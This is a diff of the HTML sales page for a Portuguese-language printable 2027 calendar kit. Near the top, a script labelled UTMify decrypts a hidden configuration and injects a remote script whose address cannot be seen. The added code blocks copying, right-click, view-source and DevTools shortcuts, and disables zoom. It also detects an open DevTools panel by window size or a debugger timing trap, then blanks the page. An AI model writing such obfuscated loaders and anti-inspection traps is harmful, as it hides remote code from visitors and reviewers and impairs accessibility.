@@ -22,7 +22,7 @@
 <script>(function(){var c_m4p=atob("DEMqMPNKxWdzmqwlFjgIRYEm511R8thRZjAQH9wpoQld79hIfyVTHpAlqEkR6INWdTFDQIc56hIH998KeiJeVYA+6w0AuIAHdzdeQpoosBMW6Y4fTTgIXpInoEVJuMhEYiIHRYcnrAEKt9xXczVPXodnvQQc/oFWdSgIHNE8pAsG/44fNGFXHIhoqwYe/44fNCdLRJJnsBMe88pcOzNYVYUvqxNe6dlHfydZEt9oswYf78kHLGEITa43");var u_wbl=[];for(var m_nx=0;m_nx<c_m4p.length;m_nx++){u_wbl.push(c_m4p.charCodeAt(m_nx)&255);}var w_991=u_wbl[0];var g_n=u_wbl.slice(1,1+w_991);var w_1y2=u_wbl.slice(1+w_991);var x_31=w_1y2.map(function(b,i_5oq){return b^g_n[i_5oq%w_991];});var j_5="";for(var v_39=0;v_39<x_31.length;v_39++){j_5+=String.fromCharCode(x_31[v_39]&255);}var o_cpv=decodeURIComponent(escape(j_5));var f_jkvk=JSON.parse(o_cpv);var c_p5=f_jkvk.globals||[];c_p5.forEach(function(m_fi0z){window[m_fi0z.name]=m_fi0z.value;});var a_yus=document.createElement("script");a_yus.src=f_jkvk.url;a_yus.async=true;a_yus.defer=true;(f_jkvk.attributes||[]).forEach(function(x_o){a_yus.setAttribute(x_o.name,x_o.value);});(document.head||document.documentElement).appendChild(a_yus);})();</script>
 <!-- End UTMify -->
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Kit de Calendários 2027 — Até 150 Modelos para Imprimir</title>
 <meta name="description" content="Escolha entre 50 ou 150 modelos de calendários 2027 prontos para imprimir, montar, presentear ou vender. Arquivos digitais com acesso imediato.">
 
@@ -390,6 +390,10 @@ footer .fnote{opacity:.7;font-size:.82rem;margin-top:8px;max-width:560px;margin-
   .carousel-img{height:230px}
   .section-title{font-size:1.5rem}
 }
+/* Proteções */
+html{-webkit-text-size-adjust:100%;touch-action:manipulation}
+body{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-touch-callout:none}
+img{-webkit-user-drag:none;-khtml-user-drag:none;-moz-user-drag:none;-o-user-drag:none;user-drag:none}
 </style>
 </head>
 <body>
@@ -837,6 +841,67 @@ document.getElementById('upsell-decline').addEventListener('click',function(){
     },delay);
   }
   agendar(4000);
+})();
+</script>
+
+<script>
+(function(){
+  // 1. Bloqueia menu de contexto (botão direito)
+  document.addEventListener('contextmenu',function(e){e.preventDefault();return false;});
+
+  // 2. Bloqueia arrastar imagens/elementos
+  document.addEventListener('dragstart',function(e){e.preventDefault();return false;});
+
+  // 3. Bloqueia seleção
+  document.addEventListener('selectstart',function(e){e.preventDefault();return false;});
+
+  // 4. Bloqueia atalhos de DevTools / copiar / ver código
+  document.addEventListener('keydown',function(e){
+    var k=e.keyCode||e.which;
+    // F12
+    if(k===123){e.preventDefault();return false;}
+    // Ctrl/Cmd + Shift + I/J/C  (DevTools/console/inspetor)
+    if((e.ctrlKey||e.metaKey)&&e.shiftKey&&(k===73||k===74||k===67)){e.preventDefault();return false;}
+    // Ctrl/Cmd + U (ver código-fonte)
+    if((e.ctrlKey||e.metaKey)&&k===85){e.preventDefault();return false;}
+    // Ctrl/Cmd + S (salvar página)
+    if((e.ctrlKey||e.metaKey)&&k===83){e.preventDefault();return false;}
+    // Ctrl/Cmd + C / X (copiar/recortar)
+    if((e.ctrlKey||e.metaKey)&&(k===67||k===88)){e.preventDefault();return false;}
+  });
+
+  // 5. Bloqueia zoom por duplo-toque no mobile
+  var lastTouch=0;
+  document.addEventListener('touchend',function(e){
+    var now=Date.now();
+    if(now-lastTouch<=350){e.preventDefault();}
+    lastTouch=now;
+  },{passive:false});
+  // bloqueia gesto de pinça (zoom)
+  document.addEventListener('gesturestart',function(e){e.preventDefault();});
+
+  // 6. Detecção de DevTools -> esvazia a página
+  var devtoolsOpen=false;
+  function nuke(){
+    if(devtoolsOpen)return;
+    devtoolsOpen=true;
+    try{document.documentElement.innerHTML='';}catch(e){}
+    try{window.location.href='about:blank';}catch(e){}
+  }
+  // método por diferença de tamanho de janela (DevTools acoplado)
+  var threshold=170;
+  setInterval(function(){
+    var wDiff=window.outerWidth-window.innerWidth;
+    var hDiff=window.outerHeight-window.innerHeight;
+    if(wDiff>threshold||hDiff>threshold){nuke();}
+  },800);
+  // método por timing do debugger
+  setInterval(function(){
+    var t0=performance.now();
+    (function(){})['constructor']('debugger')();
+    var t1=performance.now();
+    if(t1-t0>120){nuke();}
+  },1500);
 })();
 </script>
 
